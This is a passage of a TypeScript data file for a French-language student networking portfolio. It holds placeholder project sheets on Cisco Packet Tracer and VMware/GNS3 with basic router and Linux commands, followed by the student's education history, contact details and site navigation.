      '[À COMPLÉTER] Légende du schéma : placez « cisco-packet-tracer-schema.png » dans le dossier « public ».',
    etapes: [
      '[À COMPLÉTER] Construction de la topologie dans Packet Tracer',
      "[À COMPLÉTER] Définition du plan d'adressage",
      "[À COMPLÉTER] Configuration des interfaces et du routage",
      '[À COMPLÉTER] Tests de connectivité (ping, traceroute) et diagnostic',
    ],
    commandes: [
      {
        titre: '[À COMPLÉTER] Exemple — Configuration de base d’un routeur',
        commandes: [
          { commande: 'enable', explication: 'Passer en mode privilégié' },
          { commande: 'configure terminal', explication: 'Entrer en mode de configuration' },
          { commande: 'ip address <adresse> <masque>', explication: 'Attribuer une adresse à une interface' },
        ],
      },
    ],
    galerie: [],
    resultats: [
      '[À COMPLÉTER] Décrivez uniquement ce que vous avez réellement obtenu : réseaux qui communiquent ou non, problèmes de routage observés.',
    ],
    difficultes: [
      {
        difficulte: '[À COMPLÉTER] Décrivez une difficulté réellement rencontrée',
        solution: '[À COMPLÉTER] Expliquez comment vous l’avez résolue (ou indiquez « non résolue »)',
      },
    ],
    competences: [
      'Conception de topologies réseau',
      "Application d'un plan d'adressage IP",
      'Configuration de base des équipements Cisco',
    ],
    technologies: ['Cisco Packet Tracer', 'Réseaux'],
    rapport: '',
  },
  {
    slug: 'virtualisation-vmware-gns3',
    masque: true,
    titre: 'Virtualisation avec VMware et GNS3',
    contexte: 'Travaux pratiques — Virtualisation',
    periode: 'Licence 3',
    statut: 'Fiche en cours de rédaction',
    resume:
      "Utilisation d'outils de virtualisation pour créer et gérer des environnements de travail : machines virtuelles avec VMware et simulation d'équipements réseau avec GNS3, en support des autres travaux pratiques.",
    problematique:
      "[À COMPLÉTER] Décrivez la problématique : pourquoi la virtualisation est indispensable pour les TP (isolation, économie de ressources, reproductibilité des environnements).",
    objectifs: [
      '[À COMPLÉTER] Exemple — Créer et configurer des machines virtuelles sous VMware',
      '[À COMPLÉTER] Exemple — Installer et configurer GNS3',
      "[À COMPLÉTER] Exemple — Intégrer des images d'équipements et construire une topologie de simulation",
    ],
    environnement: [
      'VMware (machines virtuelles)',
      'GNS3 (simulation réseau)',
      '[À COMPLÉTER] Poste hôte utilisé (système, ressources)',
    ],
    schema: '/virtualisation-schema.png',
    schemaLegende:
      '[À COMPLÉTER] Légende du schéma : placez « virtualisation-schema.png » dans le dossier « public ».',
    etapes: [
      '[À COMPLÉTER] Création et configuration des machines virtuelles sous VMware',
      '[À COMPLÉTER] Gestion des ressources et des réseaux virtuels',
      '[À COMPLÉTER] Installation et prise en main de GNS3',
      "[À COMPLÉTER] Intégration des images d'équipements et construction de la topologie",
    ],
    commandes: [
      {
        titre: '[À COMPLÉTER] Exemple — Vérification des réseaux virtuels',
        commandes: [
          { commande: 'ip a', explication: 'Afficher les interfaces réseau d’une machine virtuelle Linux' },
        ],
      },
    ],
    galerie: [],
    resultats: [
      '[À COMPLÉTER] Décrivez uniquement ce que vous avez réellement obtenu : machines fonctionnelles, topologies simulées, limites rencontrées (ressources, compatibilité).',
    ],
    difficultes: [
      {
        difficulte: '[À COMPLÉTER] Décrivez une difficulté réellement rencontrée',
        solution: '[À COMPLÉTER] Expliquez comment vous l’avez résolue (ou indiquez « non résolue »)',
      },
    ],
    competences: [
      'Création et gestion de machines virtuelles avec VMware',
      'Prise en main de GNS3 pour la simulation réseau',
      'Organisation d’environnements de travail virtualisés',
    ],
    technologies: ['VMware', 'GNS3'],
    rapport: '',
  },
];

export const formations: Formation[] = [
  {
    intitule: 'Licence 3 — Systèmes, Réseaux et Télécommunications',
    etablissement: 'Université Alioune Diop de Bambey',
    periode: '2026 – aujourd’hui',
    description:
      "Formation axée sur l'administration des systèmes (Windows Server, Linux), la conception et l'administration des réseaux, les services réseau (DNS, DHCP), la virtualisation (VMware, GNS3) et la sécurité informatique.",
  },
  {
    intitule: 'Licence 1-2 — Systèmes, Réseaux et Télécommunications',
    etablissement: 'Université Alioune Diop de Bambey',
    periode: '2024 – 2026',
    description: 'Premières années de la filière SRT.',
  },
  {
    intitule: 'Cisco Networking Academy — Switching, Routing, and Wireless Essentials (SRWE)',
    etablissement: 'Cisco Networking Academy (parcours CCNA)',
    periode: '2026',
    description: 'Formation complémentaire en réseaux.',
  },
  {
    intitule: 'Elements of AI',
    etablissement: 'Université d’Helsinki et Sorbonne Université',
    periode: '2025',
    description: 'Formation suivie en entier.',
  },
  {
    intitule: 'Baccalauréat série S2',
    etablissement: 'Lycée Seydina Limamoulaye, Guédiawaye',
    periode: '2022 – 2023',
    description: '',
  },
];

export const certifications: { intitule: string; organisme: string; annee: string; lien: string }[] = [];

export const contact = {
  titre: 'Contact',
  intro:
    "N'hésitez pas à me contacter pour échanger autour de mon parcours, de mes projets académiques ou d'une opportunité de stage.",
  email: 'dioristagaye@gmail.com',
  telephone: '',
  ville: 'Dakar, Sénégal',
  github: '',
};

export const navigation = [
  { libelle: 'Accueil', ancre: 'accueil' },
  { libelle: 'À propos', ancre: 'a-propos' },
  { libelle: 'Compétences', ancre: 'competences' },
  { libelle: 'Projets', ancre: 'projets' },
  { libelle: 'Formations', ancre: 'formations' },
  { libelle: 'Contact', ancre: 'contact' },
];
